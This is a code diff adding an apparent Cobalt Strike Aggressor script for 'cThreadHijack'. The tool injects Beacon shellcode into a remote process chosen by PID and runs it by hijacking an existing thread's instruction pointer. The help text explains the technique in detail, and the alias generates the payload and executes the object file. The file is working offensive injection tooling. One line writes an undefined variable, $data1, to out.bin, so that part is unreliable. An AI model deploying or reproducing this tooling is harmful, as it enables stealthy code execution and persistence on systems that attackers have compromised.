@@ -1,0 +1,52 @@
+# Register help/usage for cThreadHijack
+beacon_command_register(
+"cThreadHijack",
+"cThreadHijack: Remote process injection via thread hijacking",
+"\ncThreadHijack: Remote process injection via thread hijacking\n".
+"\nUsage: cThreadHijack PID LISTENER_NAME\n".
+"\ncThreadHijack works by injecting raw Beacon shellcode, generated via a user-supplied listener argument, into a remote process, defined by the user-supplied PID argument, via VirtualAllocEx and WriteProcessMemory. Then, instead of spawning a new remote thread via CreateRemoteThread or other APIs, cThreadHijack identifies the first enumerated thread in the target process, suspends it, and retrieves the contents of the thread's CPU state via a CONTEXT structure. Then, the RIP register member of the CONTEXT structure (on 64-bit systems) is manipulated to point to the address of the aforementioned remote Beacon shellcode. Prior to execution, a routine is added to wrap the Beacon shellcode inside of a call to CreateThread - giving Beacon its own thread to work in, with this thread being locally spawned, versus being spawned remotely. The CreateThread routine is also wrapped in an NtContinue function call routine, allowing restoration of the previously hijacked thread without crashing the remote process. Beacon payloads for cThreadHijack are generated with a 'thread' exit function, allowing process continuation after the Beacon has been exited. Beacon listener names, when containing a space, must be placed in quotes.\n".
+"\nExample usage: cThreadHijack 8897 \"HTTPS Listener\"\n"
+);
+
+# Setup cThreadHijack
+alias cThreadHijack {
+
+    # Alias for Beacon ID and args
+    local('$bid $listener $pid $payload');
+    
+    # Set the number of arguments
+    ($bid, $pid, $listener) = @_;
+
+    # Determine the amount of arguments
+    if (size(@_) != 3)
+    {
+        berror($bid, "Error! Please enter a valid listener and PID");
+		return;
+    }
+
+    # Read in the BOF
+    $handle = openf(script_resource("cThreadHijack.o"));
+    $data = readb($handle, -1);
+    closef($handle);
+
+    # Verify PID is an integer
+    if ((!-isnumber $pid) || (int($pid) <= 0))
+    {
+        berror($bid, "Please enter a valid PID!\n");
+        return;
+    }
+
+    # Generate a new payload 
+    $payload = payload_local($bid, $listener, "x64", "thread");
+    $handle1 = openf(">out.bin");
+    writeb($handle1, $data1);
+    closef($handle1);
+    
+    # Pack the arguments
+    # 'b' is binary data and 'i' is an integer
+    $args = bof_pack($bid, "ib", $pid, $payload);
+
+    # Run the BOF
+    # go = Entry point of the BOF
+    beacon_inline_execute($bid, $data, "go", $args);
+}
